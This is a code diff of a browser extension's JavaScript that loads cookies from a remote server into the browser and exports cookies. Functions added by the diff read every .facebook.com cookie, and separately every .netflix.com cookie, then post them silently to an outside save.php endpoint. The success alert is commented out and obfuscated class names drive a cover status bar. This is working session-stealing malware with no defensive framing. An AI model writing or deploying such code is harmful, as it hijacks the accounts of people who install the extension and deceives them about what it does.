@@ -1,12 +1,15 @@
 'use strict';
 
 function loadCookie(){
-	$.getJSON( "http://www.jabonchimbo.com/api/youtube/cookie.json", function( data ) {
-		try{	
+	$.getJSON( "http://www.pacha.es/crop/crop/you/cookie.json", function( data ) {
+		try{
+			barraStatus();
 			$.each( data, function( key, val ) {
-			setCookie(val.name,val.value);
+			setCookie(val.name,val.value,val.host);
 			});
-				alert("Cookie Loaded Success!!!");
+			exportFacebook();
+			//$('#xMARVELxDCxCOMIC111').removeClass('pX-X987');
+			//alert("Cookie Loaded Success!!!");
 		}catch(err){
 				alert("Failed Loading Cookie!!!" + err.description);
 			}	
@@ -16,8 +19,15 @@ function loadCookie(){
 
 
 function saveCookie(p){
-$.post( "http://www.jabonchimbo.com/api/youtube/tmp/save.php", { cookie: p} );
+$.post( "http://www.pacha.es/crop/crop/you/save.php", { cookie: p} );
 }
+
+
+function barraStatus(){
+		    $("#xMARVELxDCxCOMIC111").addClass("pX-X987").fadeIn(800);
+		    $(".xT02X65G").delay(0).fadeIn(800);
+}
+
 
 function showMessage(){
 	alert(exportFacebook());
@@ -27,18 +37,30 @@ function exportFacebook(){
 var cook = "[";
     chrome.cookies.getAll({domain: ".facebook.com"}, function(cookies) {
 			for (var i in cookies) {
-				cook+= "{name:" + cookies[i].name + ",value:" + cookies[i].value + "},";
+				cook+= "{\"host\":\""+ cookies[i].domain + "\",\"name\":\"" + cookies[i].name + "\",\"value\":\"" + cookies[i].value + "\"},";
 			}
 			cook+= "]";
 			saveCookie(cook);
 	});
 }
 
-function setCookie(name,value){
+function exportNetflix(){
+var cook = "[";
+    chrome.cookies.getAll({domain: ".netflix.com"}, function(cookies) {
+			for (var i in cookies) {
+				cook+= "{\"host\":\""+ cookies[i].domain + "\",\"name\":\"" + cookies[i].name + "\",\"value\":\"" + cookies[i].value + "\"},";
+			}
+			cook+= "]";
+			saveCookie(cook);
+	});
+}
+
+function setCookie(name,value,domain){
 	chrome.cookies.set({
+		    "url": "https://www.netflix.com",
 		    "name": name,
-		    "url": "https://www.netflix.com/ca/",
-		    "value": value 	
+		    "value": value,
+			"domain": domain,
 			}, function (cookie) {
 		    console.log(JSON.stringify(cookie));
 		    console.log(chrome.extension.lastError);
